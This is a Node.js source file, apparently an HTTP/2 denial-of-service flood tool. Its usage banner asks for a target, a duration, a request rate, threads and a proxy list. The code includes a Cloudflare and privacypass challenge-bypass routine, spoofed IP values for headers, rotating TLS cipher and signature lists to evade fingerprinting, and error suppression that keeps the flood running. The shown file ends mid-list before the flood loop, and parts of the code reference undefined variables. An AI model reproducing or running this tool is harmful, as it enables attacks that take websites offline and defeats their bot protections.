const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
const numCPUs = require('os').cpus().length;
const url = require('url');
const stringRandom = require('string-random'); 
 const crypto = require("crypto");
 const fs = require("fs");
 scp = require("set-cookie-parser");
 const gradient = require("gradient-string")
const http = require('http');
const https = require('https');
const HttpsProxyAgent = require('https-proxy-agent');
 const cloudscraper = require('cloudscraper')
 const {
  HeaderGenerator
} = require('header-generator');
const os = require('os');
const UserAgent = require('user-agents');
var privacyPassSupport = true;
const util = require('util');
const dns = require('dns');
const lookupPromise = util.promisify(dns.lookup);
const { v4: uuidv4 } = require('uuid');


let headers = {};

function Cloudflare() {
    const privacypass = require('./privacypass'),
        cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    var privacyPassSupport = true;
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }
  
    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }
  
    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {
  
                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }
  
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uagent,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }
                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uagent, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uagent, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                } else {
  
                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }
    return bypass;
  }
  
  const { HTTP2_HEADER_PATH } = http2.constants;
  
  
  
  const MAX_RETRIES = 5;
  const BACKOFF_MULTIPLIER = 2;
  const RATE_LIMIT_HEADERS = ['Retry-After', 'X-RateLimit-Reset', 'X-RateLimit-Retry-After'];
  
  const handleRateLimit = async (parsed, dynHeaders, retriesLeft = MAX_RETRIES) => {
    return new Promise((resolve, reject) => {
      const session = http2.connect(parsed);
      const request = session.request({
        [HTTP2_HEADER_PATH]: '/',
        ...dynHeaders,
      });
  
      let responseBody = '';
  
      request.on('response', (dynHeaders, flags) => {
        const statusCode = headers[':status'];
  
        if (statusCode === 429 || statusCode === 503) {
          if (retriesLeft > 0) {
            const retryAfterHeader = RATE_LIMIT_HEADERS.find(dynHeaders => dynHeaders[dynHeaders]);
            let retryAfterSeconds = 1;
  
            if (retryAfterHeader) {
              const retryAfterValue = headers[retryAfterHeader];
              retryAfterSeconds = parseInt(retryAfterValue, 10);
            }
  
            session.destroy();
            setTimeout(() => handleRateLimit(url, dynHeaders, retriesLeft - 1).then(resolve).catch(reject), retryAfterSeconds * 1000);
          } else {
            reject(new Error('Too many retries'));
          }
        } else {
          request.on('data', chunk => {
            responseBody += chunk;
          });
  
          request.on('end', () => {
            resolve({ statusCode, dynHeaders, body: responseBody });
          });
        }
      });
  
      request.on('error', reject);
    });
  };
  
  


process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 
if (process.argv.length < 7){console.log(gradient.vice(`
node methodkontol <target> <duration> <request per second> <threads> <proxyfile>

node methodkontol https://kontol.com 300 30 3 proxy.txt --postdata "user=f&pass=%RAND%" --randrate --full true

--randrate ( randomizer rate 1 to 90 good bypass to rate )
`)); process.exit();}
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
let isFull = process.argv.includes('--full');
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;


  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
    const getRandomByte = () => {
      return Math.floor(Math.random() * 9999);
    };
    return `${getRandomByte()}`;
  };
  
  const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]) * 2,
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }
 const sig = [    
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
'ecdsa_brainpoolP256r1tls13_sha256',
'ecdsa_brainpoolP384r1tls13_sha384',
'ecdsa_brainpoolP512r1tls13_sha512',
'ecdsa_sha1',
'ed25519',
'ed448',
'ecdsa_sha224',
'rsa_pkcs1_sha1',
'rsa_pss_pss_sha256',
'dsa_sha256',
'dsa_sha384',
'dsa_sha512',
'dsa_sha224',
'dsa_sha1',
'rsa_pss_pss_sha384',
'rsa_pkcs1_sha2240',
'rsa_pss_pss_sha512',
'sm2sig_sm3',
'ecdsa_secp521r1_sha512'
 ];

const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
  'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
  'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
  'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
  'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
